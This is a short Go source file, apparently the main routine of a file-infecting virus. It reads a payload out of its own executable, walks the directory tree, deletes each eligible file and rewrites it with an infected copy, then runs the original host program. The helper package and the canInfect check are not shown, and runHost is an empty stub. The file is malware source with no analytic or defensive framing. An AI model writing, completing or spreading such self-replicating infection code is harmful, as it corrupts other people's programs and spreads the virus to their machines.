package main

import (
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"

	"./infect"
)

const (
	BinaryPath = "."
)

func main() {
	virus, host := infect.Unpack(os.Args[0])

	fmt.Println(string(virus))

	infectBinaries(virus)

	if host != nil {
		runHost(host)
	}

}

func infectBinaries(virus []byte) {
	root, _ := filepath.Abs(filepath.Dir(BinaryPath))

	filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
		if canInfect(path) {
			infectedBinary := infect.Infect(path, virus)
			os.Remove(path)
			ioutil.WriteFile(path, infectedBinary, info.Mode())
		}
		return nil
	})
}

func runHost(fileData []byte) {}
